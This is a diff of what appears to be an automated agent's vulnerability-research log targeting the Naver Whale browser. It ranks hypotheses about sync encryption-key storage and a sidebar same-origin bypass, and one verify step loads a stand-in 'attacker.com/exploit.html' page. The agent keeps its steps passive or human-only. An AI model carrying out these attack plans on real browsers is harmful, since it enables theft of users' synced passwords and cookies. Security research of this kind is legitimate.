@@ -1,8 +1,7 @@
-## 2026-08-08 18:05:11 UTC [browser] (model nemotron3)
-[NEW] NO_DELTA — inventory, knowledge, and leads unchanged since last aggregated hypotheses (2026-08-08 17:42:49 UTC); no new public CVEs, no new GitHub commits, no new wiki edits, all binary acquisition paths remain blocked in-sandbox
-[PRIO] Whale sync bootstrap-token envelope (OSCrypt deviation on Linux, v4.38.386.14), 6.55, atk=7 biz=8 tech=9 gate=2 cloud=3 fresh=8
-[PRIO] Whale sidebar/dual-tab boundary (sidebarAction.show + ALL-origin content_scripts + background.js no origin check, v4.38.386.14 Linux), 6.40, atk=8 biz=8 tech=8 gate=2 cloud=3 fresh=10
-[PRIO] Whale sync passphrase KDF + bootstrap-token envelope (desktop v4.38.386.14 + Android 3.9.14.9), 6.15, atk=6 biz=8 tech=7 gate=3 cloud=4 fresh=7
+## 2026-08-08 18:55:36 UTC [browser] (model nemotron3)
+[PRIO] whalesync client engine (api.whale.naver.com/whalesync + profile prefs), 6.55, atk=7 biz=8 tech=9 gate=2 cloud=3 fresh=8
+[PRIO] Whale v4.38.386.14 desktop Linux sidebar (sidebarAction.show + ALL-origin content_scripts + background.js no origin check), 6.40, atk=8 biz=8 tech=8 gate=2 cloud=3 fresh=10
+[PRIO] com.naver.whale Android 3.9.14.9 sync engine (api.whale.naver.com/whalesync), 6.15, atk=6 biz=8 tech=7 gate=3 cloud=4 fresh=7
 [HYP] Sync bootstrap-token envelope storage — Whale OSCrypt deviation on Linux
 class: AUTH
 asset: whalesync client engine (api.whale.naver.com/whalesync) + profile prefs sync.encryption_bootstrap_token_per_account sha256=053ffa4b...
@@ -21,16 +20,16 @@ evidence_needed: Script execution or cross-origin fetch in sidebar/dual-tab pane
 verify_steps: HUMAN_ONLY: Install Whale v4.38.386.14 on Linux → load sidebar-sample extension → whale.sidebarAction.show({url:'https://attacker.com/exploit.html'}) → attempt cross-origin fetch from panel content script → test drag-drop with use_navigation_bar:false → check opener/parent readback. Zero requests to Naver infra.
 impact: SOP bypass / script execution in privileged browser-UI context — cross-origin cookie/DOM/CSRF-token theft; Critical if escalates to renderer code execution
 testability: HUMAN_ONLY
-[HYP] Whale sync passphrase KDF + bootstrap-token envelope — KDF constants/iteration counts unknown
+[HYP] Android sync encryption key derivation/storage — com.naver.whale 3.9.14.9
 class: AUTH
-asset: Whale v4.38.386.14 desktop + Android 3.9.14.9 sync engine (api.whale.naver.com/whalesync)
+asset: com.naver.whale 3.9.14.9 sync engine (api.whale.naver.com/whalesync)
 confidence: 55
-reasoning: Whale-only prefs confirm bootstrap_token_per_account + _migration_done + whale_need_encryption_key_forced_time exist; Whale-forked os_crypt_whale.cc with xv10 magic confirmed in binary; /whalesync endpoint uses NEO_SES cookie auth; but KDF constants (PBKDF2 iterations, salt derivation), master-key storage location on Linux, and /whalesync/reset auth flow remain unextracted — binary acquisition blocked in-sandbox
-evidence_needed: PBKDF2 iteration count + salt source for passphrase→master-key; master-key storage path on Linux (libsecret? kwallet? file?); /whalesync/reset request shape (POST body, headers, NEO_SES validation); whether _migration_done downgrades encryption
-verify_steps: PASSIVE: objdump/strings on os_crypt_whale + whale_sync_util for KDF constants, salt derivation, master-key storage calls; strings on binary for /whalesync/reset handler; zero network. Requires binary.
+reasoning: Android sync asset confirmed at version 3.9.14.9 with SHA256 via non-Naver mirror metadata; Whale-only prefs keys and Whale-forked os_crypt_whale.cc with xv10 magic confirmed in desktop binary; Android likely shares sync encryption architecture but KDF constants, master-key storage (Android Keystore vs file), and bootstrap-token envelope format remain unextracted — binary acquisition blocked in-sandbox
+evidence_needed: PBKDF2 iteration count + salt source for passphrase→master-key on Android; master-key storage path (Keystore? file?); bootstrap-token envelope format vs desktop; /whalesync/reset request shape with NEO_SES
+verify_steps: PASSIVE: objdump/strings on extracted libwhale_sync.so + os_crypt_whale JNI bridge for KDF constants, salt derivation, master-key storage calls; strings for /whalesync/reset handler; zero network. Requires binary.
 impact: Weak KDF or predictable master-key storage → local attacker derives sync encryption key → decrypts all synced passwords/cookies/autofill across devices (High)
 testability: PASSIVE
-[PARKED] Whale sync passphrase KDF + bootstrap-token envelope — KDF constants/iteration counts unknown: confidence 55 but verify_steps requires binary acquisition which is blocked in-sandbox (all channels dead); no passive-first probe possible without binary — stale until HUMAN delivers binary
+[PARKED] Android sync encryption key derivation/storage — com.naver.whale 3.9.14.9: confidence 55 but verify_steps requires binary acquisition which is blocked in-sandbox (all channels dead); no passive-first probe possible without binary — stale until HUMAN delivers binary
 [FINAL] 1. Sync bootstrap-token envelope storage — Whale OSCrypt deviation on Linux (confidence 62, class AUTH, testability PASSIVE)
 [FINAL] 2. Sidebar/dual-tab boundary regression — CVE-2025-69235 fix omits Linux (confidence 58, class OTHER, testability HUMAN_ONLY)
 [NEXT] PROBE: objdump/strings on `os_crypt_whale` + `whale_sync_util` call sites for the bootstrap-token envelope and `/whalesync/reset` request shape (method/body/auth headers); diff pref set vs upstream Chromium; zero network — local static analysis of acquired binary only
